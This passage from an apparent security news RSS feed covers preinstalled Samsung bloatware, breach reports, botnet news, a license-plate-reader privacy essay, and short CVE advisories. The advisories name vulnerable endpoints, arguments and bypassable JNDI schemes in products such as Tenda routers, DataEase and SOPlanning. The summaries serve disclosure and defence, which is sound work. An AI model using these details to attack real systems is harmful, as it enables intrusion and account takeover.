phones in West Asia and North Africa, did more than just take up storage space, though.According to SMEX, it collected sensitive information, including biometric data and IP addresses.SMEX’s analysis says the software, developed by Israeli company ironSource, is deeply integrated into the device’s operating system. You need root access to remove it, and doing so voids the warranty.Samsung has partnered with ironSource since 2022, carrying the its Aura toolkit for telecoms companies and device maker in more than 30 markets, including Europe. The pair expanded the partnership in November 2022—the same month that US company Unity Technologies (that makes the Unity game engine) completed its $4.4bn acquisition of ironSource. That expansion made ironSource “Samsung’s sole partner on newly released A-series and M-series mobile devices in over 50 markets across MENA – strengthening Aura’s footprint in the region.”SMEX’s investigation of ironSource’s products points to software called Install Core. It cites our own research of this software, which is touted as an advertising technology platform, but can install other products without the user’s permission.AppCloud wasn’t listed on the Unity/Ironsource website this February when SMEX wrote its in-depth analysis. It still isn’t. It also doesn’t appear on the phone’s home screen. It runs quietly in the background, meaning there’s no privacy policy to read and no consent screen to click, says SMEX.Screenshots shared online suggest AppCloud can access network connections, download files at will, and prevent phones from sleeping. However, this does highlight one important aspect of this software: While you might not be able to start it from your home screen or easily remove it, you can disable it in your application list. Be warned, though; it has a habit of popping up again after system updates, say users.Not Samsung’s first privacy controversyThis isn’t Samsung’s first controversy around user privacy. Back in 2015, it was criticized for warning users that some smart TVs could listen to conversations and share them with third parties.Neither is it the first time that budget phone users have had to endure pre-installed software that they might not have wanted. In 2020, we reported on malware that was pre-installed on budget phones made available via the US Lifeline program.In fact, there have been many cases of pre-installed software on phones that are identifiable as either malware or potentially unwanted programs. In 2019, Maddie Stone, a security researcher for Google’s Project Zero, explained how this software makes its way onto phones before they reach the shelves. Sometimes, phone vendors will put malware onto their devices after being told that it’s legitimate software, she warned. This can result in botnets like Chamois, which was built on pre-installed malware purporting to be from an SDK.One answer to this problem is to buy a higher-end phone, but you shouldn’t have to pay more to get basic privacy. Budget users should expect the same level of privacy as anyone else. We wrote a guide to removing bloatware— it’s from 2017, but the advice is still relevant. We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>CVE-2025-63685 - Quark Cloud Drive DLL Hijacking</title><link>https://cvefeed.io/vuln/detail/CVE-2025-63685</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 21:16:06 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-63685
 Nov. 20, 2025, 9:16 p.m. | 1 day ago
Quark Cloud Drive v3.23.2 has a DLL Hijacking vulnerability. This vulnerability stems from the insecure loading of system libraries. Specifically, the application does not validate the path or signature of [regsvr32.exe] it loads. An attacker can place a crafted malicious DLL in the application's startup directory, which will be loaded and executed when the user launches the program.
 9.8 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-63807 - &quot;Blogin Weak Verification Code Brute-Force Authentication Bypass&quot;</title><link>https://cvefeed.io/vuln/detail/CVE-2025-63807</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 21:16:06 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-63807
 Nov. 20, 2025, 9:16 p.m. | 1 day ago
An issue was discovered in weijiang1994 university-bbs (aka Blogin) in commit 9e06bab430bfc729f27b4284ba7570db3b11ce84 (2025-01-13). A weak verification code generation mechanism combined with missing rate limiting allows attackers to perform brute-force attacks on verification codes without authentication. Successful exploitation may result in account takeover via password reset or other authentication bypass methods.
 9.8 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-48986 - Revive Adserver Authorization Bypass Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-48986</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 20:16:22 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-48986
 Nov. 20, 2025, 8:16 p.m. | 1 day, 1 hour ago
Authorization bypass in Revive Adserver 5.5.2 and 6.0.1 and earlier versions causes an logged in attacker to change other users' email address and potentialy take over their accounts using the forgot password functionality.
 8.8 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-52668 - Revive Adserver Stored XSS</title><link>https://cvefeed.io/vuln/detail/CVE-2025-52668</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 20:16:22 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-52668
 Nov. 20, 2025, 8:16 p.m. | 1 day, 1 hour ago
Improper input neutralization in the stats-conversions.php script in Revive Adserver 5.5.2 and 6.0.1 and earlier versions causes potential information disclosure and session hijacking via a stored XSS attack.
 8.7 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Unquoted Paths: The Decades-Old Windows Flaw Still Enabling Hidden Code Execution</title><link>https://spektion.com/articles/unquoted-path-flaw/</link><author>/u/runtimesec</author><category>netsec</category><pubDate>Thu, 20 Nov 2025 19:47:04 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-10571 - ABB Ability Edgenius Authentication Bypass</title><link>https://cvefeed.io/vuln/detail/CVE-2025-10571</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 19:16:11 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-10571
 Nov. 20, 2025, 7:16 p.m. | 1 day ago
Authentication Bypass Using an Alternate Path or Channel vulnerability in ABB ABB Ability Edgenius.This issue affects ABB Ability Edgenius: 3.2.0.0, 3.2.1.1.
 9.6 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Mozilla Says It’s Finally Done With Two-Faced Onerep</title><link>https://krebsonsecurity.com/2025/11/mozilla-says-its-finally-done-with-two-faced-onerep/</link><author>BrianKrebs</author><category>security</category><pubDate>Thu, 20 Nov 2025 19:06:51 +0000</pubDate><source url="https://krebsonsecurity.com/">Krebs on Security</source><content:encoded><![CDATA[In March 2024,  said it was winding down its collaboration with  — an identity protection service offered with the  web browser that promises to remove users from hundreds of people-search sites — after KrebsOnSecurity revealed Onerep’s founder had created dozens of people-search services and was continuing to operate at least one of them. Sixteen months later, however, Mozilla is still promoting Onerep. This week, Mozilla announced its partnership with Onerep will officially end next month.Mozilla Monitor. Image Mozilla Monitor Plus video on Youtube.In a statement published Tuesday, Mozilla said it will soon discontinue , which offered data broker site scans and automated personal data removal from Onerep.“We will continue to offer our free Monitor data breach service, which is integrated into Firefox’s credential manager, and we are focused on integrating more of our privacy and security experiences in Firefox, including our VPN, for free,” the advisory reads.Mozilla said current Monitor Plus subscribers will retain full access through the wind-down period, which ends on Dec. 17, 2025. After that, those subscribers will automatically receive a prorated refund for the unused portion of their subscription.“We explored several options to keep Monitor Plus going, but our high standards for vendors, and the realities of the data broker ecosystem made it challenging to consistently deliver the level of value and reliability we expect for our users,” Mozilla statement reads.On March 14, 2024, KrebsOnSecurity published an investigation showing that Onerep’s Belarusian CEO and founder launched dozens of people-search services since 2010, including a still-active data broker called Nuwber that sells background reports on people. Shelest released a lengthy statement wherein he acknowledged maintaining an ownership stake in , a data broker he founded in 2015 — around the same time he launched Onerep.]]></content:encoded></item><item><title>Hacker claims to steal 2.3TB data from Italian rail group, Almavia</title><link>https://www.bleepingcomputer.com/news/security/hacker-claims-to-steal-23tb-data-from-italian-rail-group-almavia/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 20 Nov 2025 18:54:17 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Data from Italy's national railway operator, the FS Italiane Group, has been exposed after a threat actor breached the organization's IT services provider, Almaviva. [...]]]></content:encoded></item><item><title>Hacker claims to steal 2.3TB data from Italian rail group, Almaviva</title><link>https://www.bleepingcomputer.com/news/security/hacker-claims-to-steal-23tb-data-from-italian-rail-group-almaviva/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 20 Nov 2025 18:54:17 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Data from Italy's national railway operator, the FS Italiane Group, has been exposed after a threat actor breached the organization's IT services provider, Almaviva. [...]]]></content:encoded></item><item><title>CVE-2025-63888 - ThinkPHP File Template Driver Remote Code Execution Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-63888</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 18:15:50 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-63888
 Nov. 20, 2025, 6:15 p.m. | 21 hours, 42 minutes ago
The read function in file thinkphp\library\think\template\driver\File.php in ThinkPHP 5.0.24 contains a remote code execution vulnerability.
 9.8 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Stolen VPN Credentials Most Common Ransomware Attack Vector</title><link>https://thecyberexpress.com/stolen-vpn-credentials-most-common-ransomware-attack-vector/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 17:44:04 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Stolen VPN Credentials Most Common Ransomware Attack Vector]]></content:encoded></item><item><title>ShadowRay 2.0 Exploits Unpatched Ray Flaw to Build Self-Spreading GPU Cryptomining Botnet</title><link>https://thehackernews.com/2025/11/shadowray-20-exploits-unpatched-ray.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjT14rn9vNidJuASiqy00Z9vRhL2TJTbX0JWycjYzO4IMjRmjIUXYYKPW_F9caqm4qWn0bA9iY9h9LN8ZaKhPI-IeWf2vpei5sHpskrH2L6OW-g5GpmbomdG-aTT9gswof2O4jhQJQyVEui8OmK4nJ72lRr92-8lcikB8w9w8V7z3xpQ8qYZaNkoSV8HMNn/s1600/clusture-hacking.jpg" length="" type=""/><pubDate>Thu, 20 Nov 2025 17:24:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Oligo Security has warned of ongoing attacks exploiting a two-year-old security flaw in the Ray open-source artificial intelligence (AI) framework to turn infected clusters with NVIDIA GPUs into a self-replicating cryptocurrency mining botnet.
The activity, codenamed ShadowRay 2.0, is an evolution of a prior wave that was observed between September 2023 and March 2024. The attack, at its core,]]></content:encoded></item><item><title>CVE-2025-64428 - DataEase DB2 JNDI Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64428</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 17:15:53 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64428
 Nov. 20, 2025, 5:15 p.m. | 16 hours, 52 minutes ago
Dataease is an open source data visualization analysis tool. Versions prior to 2.10.17 are vulnerable to JNDI injection. A blacklist was added in the patch for version 2.10.14. However, JNDI injection remains possible via the iiop, corbaname, and iiopname schemes. The vulnerability has been fixed in version 2.10.17.
 8.9 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>GlobalProtect VPN portals probed with 2.3 million scan sessions</title><link>https://www.bleepingcomputer.com/news/security/globalprotect-vpn-portals-probed-with-23-million-scan-sessions/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 20 Nov 2025 17:08:55 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A major spike in malicious scanning against Palo Alto Networks GlobalProtect portals has been detected, starting on November 14, 2025. [...]]]></content:encoded></item><item><title>Tsundere Botnet Expands Using Game Lures and Ethereum-Based C2 on Windows</title><link>https://thehackernews.com/2025/11/tsundere-botnet-expands-using-game.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWCzFuJ27zRdLiXDJLbzAKsXq1B21v769VXyN0N9wjg3aQQPMHqsiaxXi3V6LM1xbQCB0ecsOjlEEORaSeRnnFVBjK3OtrxcTS_oSQiadmLSZNDow8eeIB5QVX8q19t6MyRR5XL2CRsTy7QD-GtWn82x_HH1gcas-9NW1vDfN3QlvcpUSqRa1gnMNBD2xJ/s1600/botnet-malware-windows.jpg" length="" type=""/><pubDate>Thu, 20 Nov 2025 16:57:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have warned of an actively expanding botnet dubbed Tsundere that's targeting Windows users.
Active since mid-2025, the threat is designed to execute arbitrary JavaScript code retrieved from a command-and-control (C2) server, Kaspersky researcher Lisandro Ubiedo said in an analysis published today.
There are currently no details on how the botnet malware is propagated;]]></content:encoded></item><item><title>Oracle Identity Manager Exploit Observation from September (CVE-2025-61757), (Thu, Nov 20th)</title><link>https://isc.sans.edu/diary/rss/32506</link><author></author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 16:51:46 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[Searchlight Cyber today released a blog detailing CVE-2025-61757, a vulnerability they reported to Oracle. Oracle released a patch for the vulnerability as part of its October Critical Patch Update, which was released on October 21st.]]></content:encoded></item><item><title>Salesforce investigates customer data theft via Gainsight breach</title><link>https://www.bleepingcomputer.com/news/security/salesforce-investigates-customer-data-theft-via-gainsight-breach/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 20 Nov 2025 16:47:20 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Salesforce says it revoked refresh tokens linked to Gainsight-published applications while investigating a new wave of data theft attacks targeting customers. [...]]]></content:encoded></item><item><title>Threat actors have reportedly launched yet another campaign involving an application connected to Salesforce</title><link>https://databreaches.net/2025/11/20/threat-actors-have-reportedly-launched-yet-another-campaign-involving-an-application-connected-to-salesforce/?pk_campaign=feed&amp;pk_kwd=threat-actors-have-reportedly-launched-yet-another-campaign-involving-an-application-connected-to-salesforce</link><author>Dissent</author><category>databreach</category><pubDate>Thu, 20 Nov 2025 16:35:06 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>What the Flock is happening with license plate readers?</title><link>https://www.malwarebytes.com/blog/privacy/2025/11/what-the-flock-is-happening-with-license-plate-readers</link><author></author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 16:34:58 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[You’re driving home after another marathon day of work and kid-shuttling, nursing a lukewarm coffee in a mug that’s trying too hard. As you turn onto your street, something new catches your eye. It’s a tall pole with a small, boxy device perched on top. But it’s not a bird-house and there’s no sign. There is, however, a camera pointed straight at your car. It feels reassuring at first. After all, a neighbor was burglarized a few weeks ago. But then, dropping your kids at school the next morning, you pass another, and you start to wonder: Is my daily life being recorded and who is watching it?That’s what happened to me. After a break-in on our street, a neighborhood camera caught an unfamiliar truck. It provided the clue police needed to track down the suspects. The same technology has shown up in major investigations, including the “Coroner Affair” murder case on ABC’s 20/20. These cameras aren’t just passive hardware. They’re everywhere now, as common as mailboxes, quietly logging where we go.So if they’re everywhere, what do they collect? Who’s behind them? And what should the rest of us know before we get too comfortable or too uneasy?A mounting mountain of surveillanceALPRs aren’t hikers in the Alps. They’re Automatic License Plate Readers. Think of them as smart cameras that can “read” license plates. They snap a photo, use software to convert the plate into text, and store it. Kind of like how your phone scans handwriting and turns it into digital notes.People like them because they make things quick and hands-free, whether you’re rolling through a toll or entering a gated neighborhood. But the “A” in ALPR (automatic) is where the privacy questions start. These cameras don’t just record problem cars. They record  car they see, wherever they’re pointed.Flock Safety is a company that makes specialized ALPR systems, designed to scan and photograph every plate that passes, 24/7. Unlike gated-community or private driveway cameras, Flock systems stream footage to off-site servers, where it’s processed, analyzed, and added to a growing cloud database.At the time of writing,  there are probably well over 100,000 Flock cameras installed in the United States and increasingly rapidly. To put this in perspective, that’s one Flock camera for every 4,000 US citizens. And each camera tracks twice as many vehicles on average with no set limit.Think of it like a digital neighborhood watch that never blinks. The cameras snap high-resolution images, tag timestamps, and note vehicle details like color and distinguishing features. All of it becomes part of a searchable log for authorized users, and that log grows by the second.Adoption has exploded. Flock said in early 2024 that its cameras were used in more than 4,000 US cities. That growth has been driven by word of mouth (“our HOA said break-ins dropped after installing them”) and, in some cases, early-adopter discounts offered to communities.Credit where it’s due: these cameras can help. For many neighborhoods, Flock cameras make them feel safer. When crime ticks up or a break-in happens nearby, putting a camera at the entrance feels like a concrete way to regain control. And unlike basic security cameras, Flock systems can flag unfamiliar vehicles and spot patterns, which are useful for police when every second counts.In my community, Flock footage has helped recover stolen cars and given police leads that would’ve otherwise gone cold. After our neighborhood burglary, the moms’ group chat calmed down a little knowing there was a digital “witness” watching the entrance.In one Texas community, a spree of car break-ins stopped after a Flock camera caught a repeat offender’s plate, leading to an arrest within days. And in the “Coroner Affair” murder case, Flock data helped investigators map vehicle movements, leading to crucial evidence.Regulated surveillance can also help fight fake videos. Skilled AI and CGI artists sometimes create fake surveillance footage that looks real, showing someone or their car doing something illegal or being somewhere suspicious. That’s a serious problem, especially if used in court. If surveillance is carefully managed and trusted, it can help prove what really happened and expose fabricated videos for what they are, protecting people from false accusations.The security vs overreach tradeoffLike any powerful tool, ALPRs come with pros and cons. On the plus side, they can help solve crimes by giving police crucial evidence—something that genuinely reassures residents who like having an extra set of “digital eyes” on the neighborhood. Some people also believe the cameras deter would-be burglars, though research on that is mixed.But there are real concerns too. ALPRs collect sensitive data, often stored by third-party companies, which creates risk if that information is misused or hacked. And then there’s “surveillance creep,” which is the slow expansion of monitoring until it feels like everyone is being watched all the time.So while there are clear benefits, it’s important to think about how the technology could affect your privacy and the community as a whole.What’s being recorded and who gets to see itHere’s the other side of the coin: What else do these cameras capture, who can see it, and how long is it kept?Flock’s system is laser-focused on license plates and cars, not faces. The company says they don’t track what you’re wearing or who’s sitting beside you. Still, in a world where privacy feels more fragile every year, people (myself included) wonder how much these systems quietly log. License plate numbers, vehicle color/make/model, time, location. Some cameras can capture broader footage; some are strictly plate readers. Flock’s standard is 30 days, after which data is automatically deleted (unless flagged in an active investigation). This is where things get dicey:
Using Flock’s cloud, only “authorized users”, which can include community leaders and law enforcement, ideally with proper permissions or warrants, can view footage. Residents can make requests for someone to determine privileges.Flock claims they don’t sell data, but it’s stored off-site, raising the stakes of a breach. The bigger the database, the more appealing it is to attackers.Unlike a home security camera that you can control, these systems by design track everyone who comes and goes…not just the “bad guys.”And while these cameras don’t capture people, they do capture patterns, like vehicles entering or leaving a neighborhood. That can reveal routines, habits, and movement over time. A neighbor was surprised to learn it had logged every one of her daily trips, including gym runs, carpool, and errands. Not harmful on its own, but enough to make you realize how detailed a picture these systems build of ordinary life.The place for ALPRs… and where they don’t belongIf you’re feeling unsettled, you’re not alone. ALPRs are being installed at lightspeed, often faster than the laws meant to govern them. Will massive investment shape how future rules are written?Surveillance and data collection laws There’s no nationwide ban on license plate readers; law enforcement has used them for years. (We’ve also reported on police using drones to read license plates, raising similar concerns about oversight.) However, courts in the US increasingly grapple with how this data impacts Fourth Amendment “reasonable expectation of privacy” standards. Some states and cities have rules about where cameras can be placed on public and private roadways. They have also ordained how long footage can be kept. Check your local ordinances or ask your community for policy.A good example is Oakland, where the City Council limited ALPR data retention to six months unless tied to an active investigation. Only certain authorized personnel can access the footage, every lookup is logged and auditable, and the city must publish annual transparency reports showing usage, access, and data-sharing. The policy also bans tracking anyone based on race, religion, or political views. It’s a practical attempt to balance public safety with privacy rights.Are your neighbors allowed to record your car?If your neighborhood is private property, usually yes. HOAs and community boards can install cameras at entrances and exits, much like a private parking lot. They still have to follow state law and, ideally, notify residents, so always read the fine print in those community updates.What if the footage is misused or hacked?This is the big one. If footage leaves your neighborhood, such as handed to police, shared too widely, or leaked online, it can create liability issues. Flock says its system is encrypted and tightly controlled, but no technology is foolproof. If you think footage was misused, you can request an audit or raise it with your HOA or local law enforcement.One thing stands out in this debate: the strongest supporters of ALPRs are the groups that use or sell them, i.e. law enforcement and the companies that profit from the technology. It is difficult to find community organizations or privacy watchdogs speaking up in support. Instead, many everyday people and civil liberties groups are raising concerns. It’s worth asking why the push for ALPRs comes primarily from those who benefit directly, rather than from the wider public who are most affected by increased surveillance.As neighborhood ALPRs like Flock cameras become more common, a growing set of advocacy and educational sites has stepped in to help people understand the technology, and to push back when needed:Deflock.me is one of the most active. It helps residents opt their vehicles out where possible, track Flock deployments, and organize local resistance to unwanted surveillance.Meanwhile, Have I Been Flocked?takes an almost playful approach to a very real issue: it lets people check whether their car has appeared in Flock databases. That simple search often surprises users and highlights how easily ordinary vehicles are tracked.For folks seeking a deeper dive, Eyes on Flock and ALPR Watch map where Flock cameras and other ALPRs have been installed, providing detailed databases and reports. By shining a light on their proliferation, the sites empower residents to ask municipal leaders hard questions about the balance between public safety and civil liberties.If you want to see the broader sweep of surveillance tech in the US, the Atlas of Surveillance is a collaboration between the Electronic Frontier Foundation (EFF) and University of Nevada, Reno. It offers an interactive map of surveillance systems, showing ALPRs like Flock in context of a growing web of automated observation.Finally, Plate Privacy provides practical tools: advocacy guides, legal resources, and tips for shielding plates from unwanted scanning. It supports anyone who wants to protect the right to move through public space without constant tracking.Together, these initiatives paint a clear picture: while ALPRs spread rapidly in the name of safety, an equally strong movement is demanding transparency, limits, and respect for privacy. Whether you’re curious, cautious, or concerned, these sites offer practical help and a reminder that you’re not alone in questioning how much surveillance is too much.How to protect your privacy around ALPRsThis is where I step out of the weeds and offer real-world advice… one neighbor to another.Talk to your neighborhood or city board Who can access footage? How long is it stored? What counts as a “valid” reason to review it? Push for clear, written policies that everyone can see. Even if your state doesn’t require one, your community may still offer an option.Key questions to ask about any new camera systemWho will have access to the footage?How long will data be stored?What’s the process for police, or anyone else, to request footage?What safeguards are in place if the data is lost, shared, or misused?Protecting your own privacyCheck your community’s camera policies regularly. Homeowners Associations (HOAs) update them more often than you’d think.Consider privacy screens or physical barriers if a camera directly faces your home.Stay updated on your state’s surveillance laws. Rules around data retention and access can change.You don’t have to choose between feeling safe and feeling free. With the right policies and a bit of open conversation communities can use technology without giving up privacy. The goal isn’t to pit safety against rights, but to make sure both can coexist.What’s your take? Have ALPRs made you feel safer, more anxious, or a bit of both? Share your thoughts in the comments, and let’s keep the conversation welcoming, practical, and focused on building communities we’re proud to live in. Let’s watch out for each other not just with cameras, but with compassion and dialogue, too. You can message me on Linkedin at https://www.linkedin.com/in/mattburgess/. Cybersecurity risks should never spread beyond a headline. With Malwarebytes Personal Data Remover, you can scan to find out which sites are exposing your personal information, and then delete that sensitive data from the internet.]]></content:encoded></item><item><title>Critical Windows Graphics Vulnerability Lets Hackers Seize Control with a Single Image</title><link>https://cybersecuritynews.com/critical-windows-graphics-vulnerability/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 16:26:58 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            A critical remote code execution flaw in Microsoft’s Windows Graphics Component allows attackers to seize control of systems using specially crafted JPEG images.
With a CVSS score of 9.8, this vulnera ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CVE-2025-62730 - Privilege Escalation via Incorrect Authorization in SOPlanning</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62730</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 16:16:00 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62730
 Nov. 20, 2025, 4:16 p.m. | 17 hours, 52 minutes ago
SOPlanning is vulnerable to Privilege Escalation in user management tab. Users with user_manage_team role are allowed to modify permissions of users. However, they are able to assign administrative permissions to any user including themselves. This allow a malicious authenticated attacker with this role to escalate to admin privileges. This issue affects both Bulk Update functionality and regular edition of user's right and privileges.

This issue was fixed in version 1.55.
 8.7 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-62294 - Predictable Generation of Password Recovery Token</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62294</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 16:15:59 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62294
 Nov. 20, 2025, 4:15 p.m. | 17 hours, 52 minutes ago
SOPlanning is vulnerable to Predictable Generation of Password Recovery Token. Due to weak mechanism of generating recovery tokens, a malicious attacker is able to brute-force all possible values and takeover any account in reasonable amount of time.

This issue was fixed in version 1.55.
 8.7 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>New SonicWall SonicOS flaw allows hackers to crash firewalls</title><link>https://www.bleepingcomputer.com/news/security/new-sonicwall-sonicos-flaw-allows-hackers-to-crash-firewalls/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 15:56:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            American cybersecurity company SonicWall urged customers today to patch a high-severity SonicOS SSLVPN security flaw that can allow attackers to crash vulnerable firewalls.
Tracked as CVE-2025-40601,  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>D-Link warns of new RCE flaws in end-of-life DIR-878 routers</title><link>https://www.bleepingcomputer.com/news/security/d-link-warns-of-new-rce-flaws-in-end-of-life-dir-878-routers/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 15:38:56 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[D-Link warns of new RCE flaws in end-of-life DIR-878 routers
            D-Link is warning of three remotely exploitable command execution vulnerabilities that affect all models and hardware revisions of its DIR-878 router, which has reached end-of-service but is still ava ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CVE-2025-34320 - BASIS BBj &lt; 25.00 Unauthenticated Arbitrary File Read RCE</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34320</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 15:31:38 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34320
 Nov. 20, 2025, 4:15 p.m. | 17 hours, 52 minutes ago
BASIS BBj versions prior to 25.00 contain a Jetty-served web endpoint that fails to properly validate or canonicalize input path segments. This allows unauthenticated directory traversal sequences to cause the server to read arbitrary system files accessible to the account running the service. Retrieved configuration artifacts may contain account credentials used for BBj Enterprise Manager; possession of these credentials enables administrative access and use of legitimate management functionality that can result in execution of system commands under the service account. Depending on the operating system and the privileges of the BBj service account, this issue may also allow access to other sensitive files on the host, including operating system or application data, potentially exposing additional confidential information.
 9.3 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-13445 - Tenda AC21 SetIpMacBind stack-based overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13445</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 15:17:25 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13445
 Nov. 20, 2025, 3:17 p.m. | 17 hours, 50 minutes ago
A flaw has been found in Tenda AC21 16.03.08.16. This affects an unknown part of the file /goform/SetIpMacBind. Executing manipulation of the argument list can lead to stack-based buffer overflow. The attack can be executed remotely. The exploit has been published and may be used.
 9.0 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-13446 - Tenda AC21 SetSysTimeCfg stack-based overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13446</link><author></author><category>vulns</category><pubDate>Thu, 20 Nov 2025 15:17:25 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13446
 Nov. 20, 2025, 3:17 p.m. | 18 hours, 50 minutes ago
A vulnerability has been found in Tenda AC21 16.03.08.16. This vulnerability affects unknown code of the file /goform/SetSysTimeCfg. The manipulation of the argument timeZone/time leads to stack-based buffer overflow. The attack is possible to be carried out remotely. The exploit has been disclosed to the public and may be used.
 9.0 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Turn your Windows 11 migration into a security opportunity</title><link>https://www.bleepingcomputer.com/news/security/turn-your-windows-11-migration-into-a-security-opportunity/</link><author>Sponsored by Acronis</author><category>security</category><pubDate>Thu, 20 Nov 2025 15:05:15 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Windows 11 migration is inevitable as Windows 10 support ends, and unsupported systems create major security and ransomware risks. Acronis explains how to use this migration to review backups, strengthen cybersecurity, and ensure data stays recoverable. [...]]]></content:encoded></item><item><title>Velociraptor WSUS Exploitation, Pt. I: WSUS-Up?</title><link>https://www.huntress.com/blog/velociraptor-misuse-part-one-wsus-up</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 15:00:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
